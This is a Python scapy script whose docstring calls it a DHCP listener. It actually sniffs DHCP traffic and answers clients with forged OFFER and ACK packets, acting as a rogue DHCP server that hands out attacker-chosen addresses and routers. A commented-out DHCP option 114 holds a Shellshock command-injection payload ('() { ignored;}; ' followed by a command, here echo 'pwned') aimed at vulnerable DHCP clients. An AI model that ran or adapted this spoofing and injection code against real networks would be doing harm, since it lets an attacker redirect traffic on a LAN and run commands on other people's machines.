"""scapy-dhcp-listener.py
Listen for DHCP packets using scapy to learn when LAN 
hosts request IP addresses from DHCP Servers.
"""

from __future__ import print_function
from scapy.all import *
import time
import binascii

command = "echo 'pwned'"

if os.geteuid() != 0:
    sys.exit("Run as root ~sudo su")


# Fixup function to extract dhcp_options by key
def get_option(dhcp_options, key):

    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return (",".join(i[1:]))
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else:
                    return i[1]
    except:
        pass


def dhcp_offer(raw_mac, xid):
    packet = (Ether(src=get_if_hwaddr('wlp6s0'), dst='ff:ff:ff:ff:ff:ff') /
              IP(src="192.168.1.111", dst='192.168.1.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.1.111', xid=xid) /
              DHCP(options=[("message-type", "offer"),
                            ('server_id', '192.168.1.111'),
                            ('subnet_mask', '255.255.255.0'),
                            ('router', '192.168.2.5'),
                            ('lease_time', 172800),
                            ('renewal_time', 86400),
                            ('rebinding_time', 138240),
                            "end"]))

    return packet


def dhcp_ack(raw_mac, xid, command, requested_addr):
    packet = (Ether(src=get_if_hwaddr('wlp6s0'), dst='ff:ff:ff:ff:ff:ff') /
              IP(src="192.168.1.111", dst='192.168.1.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=requested_addr, siaddr='192.168.1.111', xid=xid) /
              DHCP(options=[("message-type", "ack"),
                            ('server_id', '192.168.1.111'),
                            ('subnet_mask', '255.255.255.0'),
                            ('router', '192.168.2.5'),
                            ('lease_time', 172800),
                            ('renewal_time', 86400),
                            ('rebinding_time', 138240),
                            "end"]))
                            # (114, "() { ignored;}; " + command),
                            
    return packet


def handle_dhcp_packet(packet):

    if packet.haslayer(DHCP):
        mac_addr = packet[Ether].src
        raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

        # Match DHCP discover
        if DHCP in packet and packet[DHCP].options[0][1] == 1:
            print('---')
            print('New DHCP Discover')
            print(packet.summary())
            print(ls(packet))
            # print "[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid)
            hostname = get_option(packet[DHCP].options, 'hostname')
            print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")
            xid = packet[BOOTP].xid
            print("[*] Sending OFFER...")
            p = dhcp_offer(raw_mac, xid)
            sendp(p, iface='wlp6s0')

        # Match DHCP offer
        elif DHCP in packet and packet[DHCP].options[0][1] == 2:
            print('---')
            print('New DHCP Offer')
            # print(packet.summary())
            # print(ls(packet))

            subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
            lease_time = get_option(packet[DHCP].options, 'lease_time')
            router = get_option(packet[DHCP].options, 'router')
            name_server = get_option(packet[DHCP].options, 'name_server')
            domain = get_option(packet[DHCP].options, 'domain')

            print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
                  f"offered {packet[BOOTP].yiaddr}")

            print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
                  f"{lease_time}, router: {router}, name_server: {name_server}, "
                  f"domain: {domain}")

        # Match DHCP request
        elif DHCP in packet and packet[DHCP].options[0][1] == 3:
            print('---')
            print('New DHCP Request')
            print(packet.summary())
            print(ls(packet))

            requested_addr = get_option(packet[DHCP].options, 'requested_addr')
            hostname = get_option(packet[DHCP].options, 'hostname')
            print(
                f"Host {hostname} ({packet[Ether].src}) requested {requested_addr}")
            xid = packet[BOOTP].xid
            # print "[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid)
            p = dhcp_ack(raw_mac, xid, command, requested_addr)
            # print hexdump(packet)
            # print packet.show()
            print("[*] Sending ACK...")
            sendp(p, iface='wlp6s0')

            # send_ack()

        # Match DHCP ack
        elif DHCP in packet and packet[DHCP].options[0][1] == 5:
            print('---')
            print('New DHCP Ack')
            # print(packet.summary())
            # print(ls(packet))

            subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
            lease_time = get_option(packet[DHCP].options, 'lease_time')
            router = get_option(packet[DHCP].options, 'router')
            name_server = get_option(packet[DHCP].options, 'name_server')

            print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
                  f"acked {packet[BOOTP].yiaddr}")

            print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
                  f"{lease_time}, router: {router}, name_server: {name_server}")

        # Match DHCP inform
        elif DHCP in packet and packet[DHCP].options[0][1] == 8:
            print('---')
            print('New DHCP Inform')
            # print(packet.summary())
            # print(ls(packet))

            hostname = get_option(packet[DHCP].options, 'hostname')
            vendor_class_id = get_option(
                packet[DHCP].options, 'vendor_class_id')

            print(f"DHCP Inform from {packet[IP].src} ({packet[Ether].src}) "
                  f"hostname: {hostname}, vendor_class_id: {vendor_class_id}")

        else:
            print('---')
            print('Some Other DHCP Packet')
            # print(packet.summary())
            # print(ls(packet))

    return


if __name__ == "__main__":
    sniff(filter="udp and (port 67 or 68)",iface='wlp6s0', prn=handle_dhcp_packet)
